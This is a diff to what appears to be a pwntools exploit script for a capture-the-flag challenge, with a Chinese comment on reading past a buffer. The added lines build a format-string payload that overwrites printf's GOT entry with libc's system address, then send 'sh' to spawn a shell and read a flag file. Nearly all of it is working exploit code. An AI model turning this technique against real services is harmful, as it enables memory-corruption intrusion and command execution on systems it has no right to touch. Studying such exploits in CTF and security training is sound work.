@@ -41,8 +41,14 @@ print(y.recvuntil('}'))
 
 printf_got = 0x601230
 system = libc+0x4f440
+fmt = ('%{}c%13$hhn%{}c%14$hn'.format(system & 0xff, ((system & 0xffff00) >> 8) - (system&0xff))).ljust(0x18, '\x00') + p64(printf_got) + p64(printf_got+1)
 
+y.sendafter(':', fmt)
+from time import sleep
+sleep(3)
+y.send('sh')
+sleep(1)
+y.sendline('cat /home/`whoami`/flag3')
+y.interactive()
 # char name[0x60], secret[0x10], buf[0x30]
 # 我们继续向后读，是可以读到 secret 的。
-
-1 39 39
